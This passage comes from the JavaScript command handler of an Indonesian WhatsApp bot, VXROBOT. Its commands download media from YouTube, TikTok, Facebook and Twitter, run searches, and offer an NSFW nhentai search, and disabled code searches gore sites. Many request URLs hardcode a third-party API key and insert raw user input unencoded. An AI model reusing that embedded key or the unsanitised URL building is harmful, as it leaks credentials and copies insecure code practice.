			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
				if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					varo.sendMessage(from, mess.wait, text, {quoted: mek})
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					media = await varo.downloadMediaMessage(encmedia)
					await wait(media).then(res => {
						varo.sendMessage(from, res.teks.trim(), text, {quoted: mek})
						varo.sendMessage(from, res.video, video, {quoted: mek, caption: res.txtx.trim()})
						limitAdd(sender,
							limit)
					}).catch(err => {
						varo.sendMessage(from, `error!`, text, {quoted: mek})
					})
                    } else {
                        reply(`Command untuk mencari judul anime dengan gambar\n\nExample : ${prefix+command} (Reply Image)`)
                    }
                    break 
		/*case 'lagumeong':
			if (!q) return fakegroup(
				`Link Nya Kawan\nContoh Penggunaan: \n${prefix+command} https://youtu.be/HEq3zZ_0WCU`
				)
			if (!isUrl(args[
				0]) && !args[0]
				.includes(
					'instagram.com'
					))
			return reply(
					mess.Iv)
			reply(mess.wait)
			hx.igdl(args[0])
				.then(async (
					result
					) => {
					for (
						let i of
							result
							.medias
						) {
						if (i
							.url
							.includes(
								'mp4'
								)
							) {
							let link =
								await getBuffer(
									i
									.url
									)
							varo
								.sendMessage(
									from,
									link,
									video, {
										quoted: mek,
										caption: `Type : ${i.type}`
									}
									)
						} else {
							let link =
								await getBuffer(
									i
									.url
									)
							varo
								.sendMessage(
									from,
									link,
									image, {
										quoted: mek,
										caption: `Type : ${i.type}`
									}
									)
						}
					}
				});

			break*/


		case 'scplay':
		case 'soundcloud':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (!q) return reply(
				`Command untuk mendownload lagu dari soundcloud.com\n\nExample : ${prefix+command} https://soundcloud.com/muafidatul-adhimah/cloud-bread-tiktok-by-gustixa?utm_source=clipboard&utm_medium=text&utm_campaign=social_sharing`
				)
			if (!q.includes(
					'soundcloud'
					))
			return reply(
					mess
					.error
					.Iv)
			reply(mess.wait)
			anu =
				await fetchJson(
					`https://api.lolhuman.xyz/api/soundcloud?apikey=vxro2k21&url=${q}`
					)
				.then((
				data) => {
					sendMediaURL
						(from,
							data
							.result,
							mek
							)
							limitAdd(sender,
								limit)
				})
				.catch((
				err) => {
					reply(String(
						err
						))
				})
			break
		case 'image':
		case 'gimage':
		case 'googleimage':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (args.length < 1)
				return reply(
					`Command untuk mencari gambar di google\n\nExample : ${prefix+command} anime`
					)
			reply(mess.wait)
			teks = args.join(
				' ')
			res =
				await googleImage(
					teks, google
					)

			function google(
				error, result) {
				if (error) {
					return reply(
						'_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_'
						)
				}
				else {
					gugIm =
						result
					random =
						gugIm[
							Math
							.floor(
								Math
								.random() *
								gugIm
								.length
								)
							]
						.url
					sendFileFromUrl
						(random,
							image, {
								quoted: mek,
								caption: `Gambar Google : ${teks}`
							})
							limitAdd(sender,
								limit)
				}
			}
			break
		case 'ytmp3':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (args.length < 1)
				return reply(
					`Command untuk mendownload lagu dari YouTube\n\nExample : ${prefix+command} https://www.youtube.com/watch?v=SXg8E_Aw6fY`
					)
			if (!isUrl(args[
				0]) && !args[0]
				.includes(
					'youtu'))
				return reply(
					mess
					.error
					.Iv)
			teks = args.join(
				' ')
			reply(mess.wait)
			res = await fetchJson(`https://api.lolhuman.xyz/api/ytaudio2?apikey=vxro2k21&url=${args[0]}`)
                        res = res.result
						if (!isPremium) {
							if (Number(
								res.link.size
								.replace(
									"MB",
									"")
								) >= 50) return reply(`Ukuran file melebihi 50MB, ingin download yang 50MB keatas? ayo join member premium ketik *${prefix}sewabot* untuk info lebih lanjut\n\nLink download: ${res.link}`)}
						shlink = await fetchJson(`https://api.lolhuman.xyz/api/shortlink?apikey=vxro2k21&url=${res.link}`)
			result =
				`   *| YOUTUBE MUSIC |*

\`\`\`▷ Title : ${res.title}\`\`\`
\`\`\`▷ Ext : MP3\`\`\`
\`\`\`▷ Size : ${res.link.size}\`\`\`
\`\`\`▷ Download : ${shlink}\`\`\`

_File sedang dikirim..._`

			sendFileFromUrl(res.thumbnail,
				image, {
					caption: result,
					quoted: mek
				})
                         buffer = await getBuffer(res.link)
				varo.sendMessage(from,buffer,
						document, {
							quoted: mek,
							mimetype: 'audio/mp3',
							filename: `${res.title}.mp3`
						}
						)
						limitAdd(sender,
							limit)
			break
		case 'ytmp4':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (args.length ==
				0) return reply(
					`Command untuk mendownload video dari YouTube\n\nExample : ${prefix+command} https://www.youtube.com/watch?v=SXg8E_Aw6fY`
				)
			ini_link = args[0]
			get_result =
				await fetchJson(
					`https://api.lolhuman.xyz/api/ytvideo2?apikey=vxro2k21&url=${ini_link}`
					)
					reply(mess.wait)
			get_result =
				get_result
				.result
				if (!isPremium) {
				if (Number(
					get_result.size
					.replace(
						"MB",
						"")
					) >= 50) return reply(`Ukuran file melebihi 50MB, ingin download yang 50MB keatas? ayo join member premium ketik *${prefix}sewabot* untuk info lebih lanjut\n\nLink download: ${get_result.link}`)}
			ini_txt =
				`   *| YOUTUBE MP4 |*\n\n▷ *Title :* ${get_result.title}\n▷ *Size :* ${get_result.size}\n\n_File sedang dikirim..._`
			ini_buffer =
				await getBuffer(
					get_result
					.thumbnail)
			await varo
				.sendMessage(
					from,
					ini_buffer,
					image, {
						quoted: mek,
						caption: ini_txt
					})
			get_audio =
				await getBuffer(
					get_result
					.link)
			await varo
				.sendMessage(
					from,
					get_audio,
					video, {
						mimetype: 'video/mp4',
						filename: `${get_result.title}.mp4`,
						quoted: mek
					})
					limitAdd(sender,
						limit)
			break
		case 'tinyurl':
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (args.length ==
				0) return reply(
					`Command untuk memperpendek link via tinyurl.com\n\nExample : ${prefix+command} https://animein.site`
				)
			res = await fetchJson(`https://api.lolhuman.xyz/api/shortlink?apikey=vxro2k21&url=${args[0]}`)
			reply(res.result)
			limitAdd(sender,
				limit)
			break
		case 'cuttly':
			case 'cutly':
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (args.length ==
				0) return reply(
					`Command untuk memperpendek link via cuttly.com\n\nExample : ${prefix+command} https://animein.site`
				)
			res = await fetchJson(`https://api.lolhuman.xyz/api/shortlink3?apikey=vxro2k21&url=${args[0]}`)
			reply(res.result)
			limitAdd(sender,
				limit)
			break
		case 'translate':
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (args.length ==
				0) return reply(
					`Command untuk memperpendek link via cuttly.com\n\nExample : ${prefix+command} id|good morning`
				)
				klss = body.slice(10)
				hass = klss.split("|")[0];
				kass = klss.split("|")[1];
			res = await fetchJson(`https://api.lolhuman.xyz/api/translate/auto/${hass}?apikey=vxro2k21&text=${kass}`)
			reply(res.result)
			limitAdd(sender,
				limit)
			break
		/*case 'ytmp4hd':
		case 'ythd':
			if (args.length ===
				0) return reply(
					`Command untuk mendownload video(hd) dari YouTube\n\nExample : ${prefix+command} https://www.youtube.com/watch?v=SXg8E_Aw6fY`
				)
			let isLinkks2 =
				args[0].match(
					/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/
					)
			if (!isLinkks2)
				return reply(
					mess
					.error
					.Iv)
			try {
				reply(mess.wait)
				ythd(args[0])
					.then((
						res) => {
							const {
								dl_link,
								thumb,
								title,
								filesizeF,
								filesize
							} =
							res
							axios
								.get(
									`https://tinyurl.com/api-create.php?url=${dl_link}`
									)
								.then(
									(
										a) => {
										if (Number(
												filesize
												) >=
											40000
											)
											return sendMediaURL(
												from,
												thumb,
												`   *| YOUTUBE MP4 HD |*

\`\`\`▷ Title : ${title}\`\`\`
\`\`\`▷ Resolution* : 720p\`\`\`
\`\`\`▷ Size* : ${filesizeF}\`\`\`
\`\`\`▷ Link* : ${a.data}\`\`\`

_Durasi melebihi batas, silahkan download melalui link di atas!_`
												)

										const
											captionsYtmp4 =
											`┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`き⃟▷ Title : ${title}\`\`\`
\`\`\`き⃟▷ Kualitas : 720p\`\`\`
\`\`\`き⃟▷ Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

										sendMediaURL
											(from,
												thumb,
												captionsYtmp4
												)
										sendMediaURL
											(from,
												dl_link,
												`nih kak`
												)
											.catch(
												() =>
												reply(
													mess
													.error
													.api
													)
												)
									}
									)
						})
			} catch (err) {
				reply(`eror`)
			}
			break*/
		case 'google':
		case 'googlesearch':
		case 'ggs':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (args.length < 1)
				return reply(
					`Command untuk mencari info dari google\n\nExample : ${prefix+command} Anime`
					)
			teks = args.join(
				' ')
			reply(mess.wait)
			res = await ggs({
				'query': `${teks}`
			})
			kant = ``
			for (let i of res) {
				kant += `*Judul :* ${i.title}
*Link :* ${i.link}
*Keterangan :* ${i.snippet}\n\n`
			}
			var akhir = kant
				.trim()
			reply(akhir)
			limitAdd(sender,
				limit)
			break
		case 'wiki':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (args.length < 1)
				return reply(
					`Command untuk mencari info dari wikipedia.org\n\nExample : ${prefix+command} Anime`
					)
			teks = args.join(
				' ')
			res =
				await wikiSearch(
					teks).catch(
					e => {
						return reply(
							'_[ ! ] Error Hasil Tidak Ditemukan_'
							)
					})
			result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
			sendFileFromUrl(res[
					0]
				.thumb,
				image, {
					quoted: mek,
					caption: result
				}).catch(
				e => {
					reply(
						result)
						limitAdd(sender,
							limit)
				})
			break
		case 'mediafire':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (args.length < 1)
				return reply(
					`Command untuk mendownload file dari mediafire.com\n\nExample : ${prefix+command} https://www.mediafire.com/file/1xgaov026oc44n0/photo_2021-02-05_10-13-39.jpg/file`
					)
			if (!isUrl(args[
				0]) && !args[0]
				.includes(
					'mediafire')
				) return reply(
				mess
				.error
				.Iv)
			reply(mess.wait)
			teks = args.join(
				' ')
			res =
				await mediafireDl(
					teks)
			result = `   *| MEDIAFIRE DOWNLOAD |*

\`\`\`▷ Nama : ${res[0].nama}\`\`\`
\`\`\`▷ Ukuran : ${res[0].size}\`\`\`
\`\`\`▷ Link : ${res[0].link}\`\`\`

_File sedang dikirim..._`
			reply(result)
			sendFileFromUrl(res[
					0].link,
				document, {
					mimetype: res[
							0
							]
						.mime,
					filename: res[
							0
							]
						.nama,
					quoted: mek
				})
				limitAdd(sender,
					limit)
			break
		/*case 'randomgore':
			try {
				reply(
					'Searching...')
				y = await fetchJson(
					`https://api-senku.herokuapp.com/api/randomgore?apikey=SenkuApi`
					)
				tg = `Random Gore

Judul: ${y.data.judul}
Views: ${y.data.views}
Coment : ${y.data.comment}
Link : ${y.data.link}
`
				sendMediaURL(
					from, y
					.data
					.link,
					monospace(
						tg))
			} catch (e) {
				console.log(e)
				reply(e)
			}
			break
		case 'searchgore':
			try {
				if (!q) return reply(
					'Gore apa yg mau dicari kak?'
					)
				srg =
					await fetchJson(
						`https://api-senku.herokuapp.com/api/searchgore?search=${q}&apikey=SenkuApi`
						)
				reply(
					'Searching...')
				tks =
					'SEARCH GORE\n\n\n'
				for (let i of
						srg
						.data) {
					tks +=
						`Judul: ${i.judul}\n`
					tks +=
						`Upload : ${i.uploader}\n`
					tks +=
						`Thumb: ${i.thumb}\n`
					tks +=
						`Link : ${i.link}\n\n\n`
				}
				sendMediaURL(
					from,
					srg
					.data[0]
					.thumb,
					monospace(
						tks)
					)
			} catch (e) {
				console.log(e)
				reply(
					'Error, mungkin query yang anda maksud tidak Tersedia!')
			}
			break*/

		case 'tiktokdl':
			case 'tiktok':
				if (isBanned) return reply(mess.baned)
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (!q) return reply(
				`Command untuk mendownload video dari TikTok\n\nExample : ${prefix+command} https://vt.tiktok.com/ZSwWCk5o/`
				)
			if (!q.includes(
					'tiktok'))
				return reply(
					mess
					.error
					.Iv)
			reply(mess.wait)
			// link = args.join(' ')
			dppa =
				await fetchJson(
					`https://api.lolhuman.xyz/api/tiktok?apikey=vxro2k21&url=${q}`
					)
			uhyy = dppa.result
			//  buffer = await getBuffer(uhyy.link)
			magee =
				await getBuffer(
					uhyy.thumbnail)
			textt =
				`Title : ${uhyy.title}\nDesc : ${uhyy.description}`
			sendButLocation(
				from, textt,
				`PILIH SALAH SATU BAWAH INI`, {
					jpegThumbnail: magee
				}, [{
					buttonId: `${prefix}tiktoknowm ${q}`,
					buttonText: {
						displayText: 'NO WATERMARK'
					},
					type: 1
				}, {
					buttonId: `${prefix}ttmp3 ${q}`,
					buttonText: {
						displayText: 'ONLY AUDIO'
					},
					type: 1
				}], {
					contextInfo: {
						mentionedJid: [
							sender,
							'0@s.whatsapp.net'
						]
					}
				})
			break

		/*case 'ttdl':
			if (!q) return reply(
				'Linknya?'
				)
			if (!q.includes(
					'tiktok'))
				return reply(
					mess
					.error
					.Iv)
			reply(mess.wait)
			anu =
				await TiktokDownloader(
					`${q}`)
				.then((
				data) => {
					sendMediaURL
						(from,
							data
							.result
							.watermark
							)
				})
				.catch((
				err) => {
					reply(String(
						err
						))
				})
			break*/
		/*case 'tiktoknowm':
			if (!q) return reply(
				`Command untuk mendownload video TikTok No WaterMark\n\nExample : ${prefix+command} https://vt.tiktok.com/ZSwWCk5o/`
				)
			if (!q.includes(
					'tiktok'))
				return reply(
					mess
					.error
					.Iv)
			data =
				await fetchJson(
					`https://api.lolhuman.xyz/api/tiktok?apikey=vxro2k21&url=${q}`
					)
			result =
				`⚜️ *Nickname*: ${data.result.author.nickname}\n❤️ *Like*: ${data.result.statistic.diggCount}\n💬 *Komentar*: ${data.result.statistic.commentCount}\n🔁 *Share*: ${data.result.statistic.shareCount}\n🎞️ *Views*: ${data.result.statistic.playCount}\n?? *Desc*: ${data.result.title}`
			buttons = [{
				buttonId: `${prefix}tt1 ${q}`,
				buttonText: {
					displayText: `▶️ Video`
				},
				type: 1
			}, {
				buttonId: `${prefix}ttaudio ${q}`,
				buttonText: {
					displayText: '🎵 Audio'
				},
				type: 1
			}]
			fs.writeFileSync(
				`./${sender}.jpeg`,
				await getBuffer(
					data
					.result
					.thumbnail
					))
			imageMsg = (
					await varo
					.prepareMessage(
						from, fs
						.readFileSync(
							`./${sender}.jpeg`
							),
						'imageMessage', {
							thumbnail: Buffer
								.alloc(
									0
									)
						}))
				.message
				.imageMessage
			buttonsMessage = {
				footerText: 'Pilih satu format di bawah ini',
				imageMessage: imageMsg,
				contentText: `${result}`,
				buttons,
				headerType: 4
			}
			prep = await varo
				.prepareMessageFromContent(
					from, {
						buttonsMessage
					}, {
						quoted: mek
					})
			varo
				.relayWAMessage(
					prep)
			fs.unlinkSync(
				`./${sender}.jpeg`
				)
			break*/
		case 'tiktoknowm':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})

			if (!q) return reply(
				`Command untuk mendownload video TikTok No WaterMark\n\nExample : ${prefix+command} https://vt.tiktok.com/ZSwWCk5o/`
				)
			if (!q.includes(
					'tiktok'))
				return reply(
					mess
					.error
					.Iv)
			reply(mess.wait)
			anu =
				await Tiktokdl(
					`${q}`)
				.then((
				data) => {
					sendMediaURL
						(from,
							data
							.result
							.nowatermark
							)
							limitAdd(sender,
								limit)
				})
				.catch((
				err) => {
					reply(String(
						err
						))
				})
			break
		case 'ttmp3':
			case 'tiktokaudio':
				if (isBanned) return reply(mess.baned)
				if (isLimit(sender,
					isPremium,
					isOwner,
					limitCount,
					limit))
				return reply(
					mess
					.limit)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (!isUrl(args[
				0]) && !args[0]
				.includes(
					'tiktok.com'
					))
			return reply(
					mess.Iv)
			if (args.length < 1)
				return reply(
					`Command untuk mendownload audio dari TikTok\n\nExample : ${prefix+command} https://vt.tiktok.com/ZSwWCk5o/`)
			lin = args[0]
			reply(mess.wait)
			hx.ttdownloader(lin)
				.then(async (
					res) => {
					console
						.log(
							'Done'
							)
					anu =
						res
						.nowm
					fto =
						Mthumb
					khs =
						await getBuffer(
							anu
							)
					varo
						.sendMessage(
							from,
							khs,
							audio, {
								quoted: mek,
								mimetype: 'audio/mp4',
								filename: 'tiktok.mp3'
							}
							)
							limitAdd(sender,
								limit)
				})
			break
		case 'fb':
		case 'facebook':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (!q) return reply(`Command untuk mendownload postingan dari facebook\n\nExample : ${prefix+command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
			reply(mess.wait)
			try {
				anu =
					await fetchJson(
						`https://api.lolhuman.xyz/api/facebook?apikey=vxro2k21&url=${args[0]}`
						)
						buffer = await getBuffer(anu.result)
						await varo.sendMessage(from, buffer, video, { quoted: mek, caption: `${args[0]}`, thumbnail: fs.readFileSync('./VXROMD/vxrobot.jpg')});
						limitAdd(sender,
							limit)
			} catch (e) {
				console.log(e)
				reply(`Error`)
			}
			break
		case 'twitter':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (!q) return reply(`Command untuk mendownload postingan dari twitter\n\n| List Command |\n▷ ${prefix+command} foto\n▷ ${prefix+command} video\n\nExample : ${prefix+command} foto https://twitter.com/memefess/status/1385161473232543747 https://twitter.com/gofoodindonesia/status/1229369819511709697`)
			if (args[0] ==='foto') {

				reply(`Tunggu sebentar...`)
								get_result = await fetchJson(`https://api.lolhuman.xyz/api/twitterimage?apikey=vxro2k21&url=${args[1]}`)
								resultan = get_result.result
				for (let i of resultan.link) {
							buffer = await getBuffer(i)
							await varo.sendMessage(from, buffer, image, { quoted: mek, caption: `${args[1]}`, thumbnail: fs.readFileSync('./VXROMD/vxrobot.jpg')});
							//await limitAdd(sender)
				}
				 } if (args[0] ==='video') {

				reply(`Tunggu sebentar...`)
								get_result = await fetchJson(`https://api.lolhuman.xyz/api/twitter?apikey=vxro2k21&url=${args[1]}`)
								resultan = get_result.result
								resultnya = resultan.link.link
				for (let i of resultnya) {
							buffer = await getBuffer(i)
							await varo.sendMessage(from, buffer, video, { quoted: mek, caption: `${resultan.title}`, thumbnail: fs.readFileSync('./VXROMD/vxrobot.jpg')});
							//await limitAdd(sender)
								limitAdd(sender,
									limit)
				}
			}
			break
		/*case 'brainly':
			brainly(args.join(
				" ")).then(
				res => {
					hmm =
						'────────────\n'
					for (let Y of
							res
							.data) {
						hmm +=
							`\n*| _BRAINLY_ |*\n\n*▷ Pertanyaan:* ${Y.pertanyaan}\n\n*▷ Jawaban:* ${Y.jawaban[0].text}\n───────────\n`
					}
					reply(
						hmm)
					console
						.log(
							res
							)
				})
			break*/
		case 'brainly':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})

			if (args.length ==
				0) return reply(`Command untuk mencari informasi di brainly.com\n\nExample : ${prefix+command} siapakah soekarno?`)
			get_result =
				await fetchJson(
					`https://api.lolhuman.xyz/api/brainly2?apikey=vxro2k21&query=${q}`
					)
			lala = get_result
				.result
			ini_txt =
				"* | BRAINLY SEARCH |*\n\n"
			for (var x of
				lala) {
				ini_txt +=
					`==============================\n`
				ini_txt +=
					`\`\`\`Pertanyaan :\`\`\`\n${x.question.content}\n\n`
				ini_txt +=
					`\`\`\`Jawaban :\`\`\`\n${x.answer[0].content}\n`
				ini_txt +=
					`==============================\n\n`
			}
			reply(ini_txt)
			limitAdd(sender,
				limit)
			break


		case 'ssweb':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (args.length ==
				0) return reply(`Command untuk menscreenshot website\n\nExample : ${prefix+command} https://animein.site`)
			ini_link = args[0]
			ini_buffer =
				await getBuffer(
					`https://api.lolhuman.xyz/api/ssweb?apikey=vxro2k21&url=${ini_link}`
					)
			await varo
				.sendMessage(
					from,
					ini_buffer,
					image, {
						quoted: mek
					})
					limitAdd(sender,
						limit)
			break
		/*case 'ytsearch': {
			if (args.length < 2)
				return reply(`Command untuk mencari video di YouTube\n\nExample : ${prefix+command} Cloud Bread Gustixa`)
			reply(mess.wait)
			yts(q)
				.then((res) => {
					let yt =
						res
						.videos
					let list = []
					let startnum =
						1
					for (var x of
							yt) {
						let yy = {
							title: 'Data ke-' +
								startnum++,
							rows: [
							{
								title: `${x.title}`,
								description: `\n\n*Viewers: ${x.views}*\n*Duration: ${x.timestamp}*\n*Upload: ${x.ago}*\n*Url: ${x.url}*`,
								rowId: `${prefix}ytdl ${x.url}`
							}]
						}
						list.push(
							yy
							)
					}
					listmsg(from,
						`*[ YTS DOWNLOAD ]*`,
						`\n${g}Data Berhasil Ditemukan, Hasil Pencarian${g} *⌕ ${q}* ${g}Pilih DIbawah Ya Kak${g}`,
						list
						)
				})
				.catch((
				err) => {
					sendMess
						(ownerNumber,
							'YT SEARCH Error : ' +
							err
							)
					console
						.log(
							color(
								'[YT SEARCH]',
								'red'
								),
							err
							)
					reply(mess
						.error
						.api
						)
				})
		}
		break*/
		case 'nhentai':
		case 'nhsearch':
		case 'nhentaisearch': {
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (isGroup && !isNsfw) return reply(`Fitur NSFW belum aktif di group ini\n\nKetik *${prefix}nsfw* untuk mengaktifkan`)
			if (!q) return reply(`Command untuk mencari doujin di nhentai\n\nExample : ${prefix+command} Nakano Nino`)
			reply(mess.wait)
			let rowsdata = [];
			let res =
				await axios.get(
					`https://api.lolhuman.xyz/api/nhentaisearch?apikey=vxro2k21&query=${args[0]}`
					)
			for (let i = 0; i <
				res.data.result
				.length; i++) {
				rowsdata.push({
					title: res
						.data
						.result[
							i
							]
						.title_english,
					rowId: `${prefix}nhentaipdf ${res.data.result[i].id}`,
					description: res
						.data
						.result[
							i
							]
						.id
				})
			}
			let listM = varo
